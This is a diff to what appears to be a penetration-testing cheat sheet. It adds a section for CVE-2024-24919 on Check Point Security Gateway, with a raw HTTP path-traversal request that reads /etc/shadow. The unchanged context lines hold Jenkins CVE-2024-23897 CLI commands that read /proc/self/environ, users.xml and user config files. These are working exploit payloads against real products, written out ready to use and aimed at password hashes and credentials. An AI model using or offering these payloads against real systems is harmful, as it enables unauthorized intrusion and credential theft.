@@ -36,6 +36,7 @@
 - [CVE-2024-21378: Microsoft Outlook RCE](#cve-2024-21378-microsoft-outlook-rce)
 - [CVE-2024-21626: Leaky Vessels Container Escape](#cve-2024-21626-leaky-vessels-container-escape)
 - [CVE-2024-23897: Jenkins Arbitrary File Read](#cve-2024-23897-jenkins-arbitrary-file-read)
+- [CVE-2024-24919: Check Point Security Gateway Information Disclosure (0-day)](#cve-2024-24919-check-point-security-gateway-information-disclosure-0-day)
 - [GodPotato LPE](#godpotato-lpe)
 - [Juicy Potato LPE](#juicy-potato-lpe)
 - [JuicyPotatoNG LPE](#juicypotatong-lpe)
@@ -1675,6 +1676,16 @@ $ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://<RHOST>:8080' help "@
 $ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://<RHOST>:8080' help "@/proc/self/environ"
 $ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://<RHOST>:8080' connect-node "@/var/jenkins_home/users/users.xml"
 $ java -jar jenkins-cli.jar -noCertificateCheck -s 'http://<RHOST>:8080' connect-node "@/var/jenkins_home/users/<USERNAME>_12108429903186576833/config.xml"
+```
+
+## CVE-2024-24919: Check Point Security Gateway Information Disclosure (0-day)
+
+```c
+POST /clients/MyCRL HTTP/1.1
+Host: <RHOST>
+Content-Length: 39
+
+aCSHELL/../../../../../../../etc/shadow
 ```
 
 ## GodPotato LPE
